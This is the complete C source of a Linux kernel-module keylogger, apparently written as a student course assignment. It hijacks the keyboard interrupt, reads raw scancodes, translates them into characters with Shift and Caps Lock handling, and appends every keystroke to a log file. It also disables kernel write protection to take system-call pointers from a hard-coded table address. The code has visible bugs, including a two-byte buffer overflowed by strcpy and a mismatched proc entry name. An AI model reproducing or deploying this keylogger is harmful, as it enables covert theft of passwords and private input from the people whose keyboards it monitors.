/*
Assignment 2 - CSC 239
Sudarshan Deo
Spring 2017
*/

#include <linux/in.h>
#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <asm/io.h>
#include <asm/irq_vectors.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/init.h>
#include <asm/current.h>
#include <linux/types.h>
#include <linux/errno.h>
#include <net/sock.h>
#include <linux/net.h>

#define MY_WORK_QUEUE_NAME "WQsched.c"

//get the syscall addr
unsigned long *syscall_table = (unsigned long *) 0xffffffff81801420;	//starting address of system call table - found in /boot/System.map-3.11.0-15-generic | grep sys_call

asmlinkage int (*original_open)(const char __user *, int, int);		//sys_open
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);	//sys_write
asmlinkage size_t (*original_read)(int, char __user *, size_t);		//sys_read
asmlinkage int (*original_close)(unsigned int);		//sys_close

void write_file(char *,char *);		//Function to log keyboard inputs into log file

static struct workqueue_struct *my_workqueue;	//Pointer to worqueue structure

//Structure to hold scancode and task
struct my_workqueue 
{
	unsigned char scancode;
       	struct work_struct task;
};

static struct my_workqueue taskinfo;

static int count = 0;

/* For writing inside /proc */
int hello_proc_show(struct seq_file *m, void *v) 
{
	count++;
	seq_printf(m, "This File is created under proc!\n");
	seq_printf(m, "Count = %d\n",count);

	//seq_printf(m, "Keylog = %s\t\t",keylog);

  	return 0;
}

int hello_proc_open(struct inode *inode, struct  file *file) 
{
  	return single_open(file, hello_proc_show, NULL);
}

struct file_operations hello_proc_fops = {
  .owner = THIS_MODULE,
  .open = hello_proc_open,
  .read = seq_read,
  .llseek = seq_lseek,
  .release = single_release,
};




/* This will get called by the kernel as soon as it's safe
* to do everything normally allowed by kernel modules.
*/

static void got_char(struct work_struct *work)
{

  	//definig the index to ASCII value mapping in char array.

	char *small_chars[150]= {"ESC",  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", 
			  "-", "=","Backspace","Tab","q", "w", "e", "r","t", "y", "u", "i", "o", 
			  "p", "[", "]", "\nEnter\n", "0","a", "s", "d", "f", "g", "h", "j", 
			  "k", "l", ";", "\\", "`",  0,"Backslash", "z", "x", "c", "v", "b", 
			  "n", "m", ",", ".", "/",   0,  "*",    "0",  " ",    "0",    
			  "0",    "0",   "0",   "0",   "0",   "0",   "0",   "0",   "0",    
			  "0",    "0",    "0",    "0",    "0",    "0",  "-",    "0",    
			  "0",    "0",  "+",    "0",    "0",    "0",    "0",   "0",    
			  "0",   "0",   "0",    "0",   "0", "0"};


 	char large_chars[150]= {'0', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', 
			  '+', '\b','\t','Q', 'W', 'E', 'R','T', 'Y', 'U', 'I', 'O', 'P', 
			  '{', '}', '\n', '0','A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 
			  ':', '\"', '~',  0,'|', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', 
			  '>', '?', '0',  '*', '0',  ' ',    '0',    '0',    '0',   '0',   
			  '0',   '0',   '0',   '0',   '0',   '0',    '0',    '0',    '0',    
			  '0',    '0',    '0',  '-',    '0',    '0',    '0',  '+',    '0',    
			  '0',    '0',    '0',   '0',    '0',   '0',   '0',    '0',   '0', '0'};

  	//container_of micro gives the starting address of my_workqueue stuct which holds the scancode.
  	struct my_workqueue *myp = container_of(work, struct my_workqueue, task);
 
 	//printing kernel log, for tracking purpose
 	printk(KERN_INFO "Scan Code %d %s.\n", (int)(myp->scancode) & 0x7F, (int)(myp->scancode) & 0x80 ? "Released" : "Pressed");
  
 	//defining the char array.
 	char keylog[2], path[40];
 	char str1[2],str2[100];
 	strcpy(path,"/home/enggsudarshan/Desktop/Temp/log"); 
 

	//count++;

 	static int shiftkey;
	//,capskey=0;
	static bool capskey=false;
 
 	//hold the key and keypressed status 
 	char *keypressed=  (int)(myp->scancode) & 0x80 ? "Released\0" : "Pressed\0";  
 	int key=(int)(myp->scancode) & 0x7F;

	printk(KERN_INFO "ESC IS %d\n",key);
 
 	//set the shifkey flag when Shift key is pressed, required for shift logic.
  	if(key==42 && !(strcmp(keypressed,"Pressed"))) 
  	{
        	shiftkey=1;
        	//printk("Shift Pressed");
  	}

  	if(key==42 && !(strcmp(keypressed,"Released")))
  	{
    		shiftkey=0;
  	}

	//For CAPS LOCK
  	if(key==58 && !(strcmp(keypressed,"Pressed"))) 
  	{
        	//capskey=1;
        	//printk("Shift Pressed");
		capskey = !capskey;
  	}
  	if(key==58 && !(strcmp(keypressed,"Released")))
  	{
    		//capskey=0;
  	}

	
  	// if shift key is hold then execute this , which support shift operation like Capital letter, and other symbols etc.
  	if(shiftkey)
  	{
      		if(key!=42 && !(strcmp(keypressed,"Pressed"))) 
		{ 
         		str1[0]=large_chars[key];
         		str1[1]='\0';
         		printk( "\n Pressed capital of : %s", str1);
         		//strcpy(keylog,str1);
         		// call write file function to write current press value.
         		write_file(str1,path);
      		}
  	}
  	else 
	{
		if(capskey)
		{
			printk(KERN_INFO "CAPS IS PRESSED\n");
			if(key!=58 && !(strcmp(keypressed,"Pressed"))) 
			{ 
         			str1[0]=large_chars[key];
         			str1[1]='\0';
         			printk( "\n Pressed capital of : %s", str1);
         			//strcpy(keylog,str1);
         			// call write file function to write current press value.
         			write_file(str1,path);
      			}	
		}
		else
		{
			printk(KERN_INFO "CAPS IS RELEASED\n");
		       	if(key!=58 && !(strcmp(keypressed,"Pressed"))) 
			{
				strcpy(str2,small_chars[key]);
         			//str2[0]=small_chars[key];
         			//str2[1]='\0';
         			printk( "\n Pressed  : %s", str2);
         			strcpy(keylog,str2);
         			write_file(keylog,path);
      			}
		}
  	}
}


//Write file functionto write the pressed key in specidied path.
void write_file(char *buffer,char *path)
{
	mm_segment_t old_fs;
	int fd;
	old_fs=get_fs();
	set_fs(KERNEL_DS);
	fd = original_open(path, O_WRONLY|O_CREAT|O_APPEND,0777); 
	if(fd >= 0)
	{
		original_write(fd,buffer,strlen(buffer));
		original_close(fd);
	}
	else
	{
		//printk(KERN_ALERT "\n MYERRORS: Errro in write_file() while opening a (( file=%s )) and (( fd= %d))" , path,fd);
	}
	set_fs(old_fs);
	return;
}



/*
* This function services keyboard interrupts. It reads the relevant
* information from the keyboard and then puts the non time critical
* part into the work queue. This will be run when the kernel considers it safe.
*/
irqreturn_t irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{

	// This variables are static because they need to be
 	// accessible (through pointers) to the bottom half routine.

    	static int initialised = 0;
    	unsigned char status;
   
  	// Read keyboard status

   	status = inb(0x64);
   	taskinfo.scancode = inb(0x60);

   	if (initialised == 0) 
	{
        	INIT_WORK(&taskinfo.task, got_char);
             	initialised = 1;
   	} 
   	// Queue the work in workqueue(Bottom half)
   	queue_work(my_workqueue, &taskinfo.task);
   	return (irqreturn_t) IRQ_HANDLED;
}


/*
* Initialize the module - register the IRQ handler
*/
int init_module()
{
   	// get the function pointers of syscalls required to invoke them witthin kernel
    	write_cr0 (read_cr0 () & (~ 0x10000));

   	original_write= (void *)syscall_table[__NR_write];
   	original_read=(void *)syscall_table[__NR_read];
   	original_close=(void *)syscall_table[__NR_close];
   	original_open=(void *)syscall_table[__NR_open];
   	write_cr0 (read_cr0 () | 0x10000);

   	//create the work queue.
   	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);

/*   
  Since the keyboard handler won't co-exist with another handler,
  such as us, we have to disable it (free its IRQ) before we do
  anything. Since we don't know where it is, there's no way to
  reinstate it later - so the computer will have to be rebooted
  when we're done.
*/
	/* Creating File under /proc */
	proc_create("key_logger", 0, NULL, &hello_proc_fops);

  	free_irq(1, NULL);

/*
   * Request IRQ 1, the keyboard IRQ, to go to our irq_handler.
   * SA_SHIRQ means we're willing to have othe handlers on this IRQ.
*/
  	return request_irq(1,/* The number of the keyboard IRQ on PCs */irq_handler, /* our handler */IRQF_SHARED, "test_keyboard_irq_handler",
		//CHANGED SA_SHIRQ to IRQF_SHARED to run in this kernel version.
			(void *)(irq_handler));
}

  
// Cleanup

void cleanup_module()
{
   /*
   * This is only here for completeness. It's totally irrelevant, since
   * we don't have a way to restore the normal keyboard interrupt so the
   * computer is completely useless and has to be rebooted.
   */

	remove_proc_entry("hello_proc", NULL);
    	free_irq(1, NULL);
}

   
// some work_queue related functions are just available to GPL licensed Modules

MODULE_LICENSE("GPL");

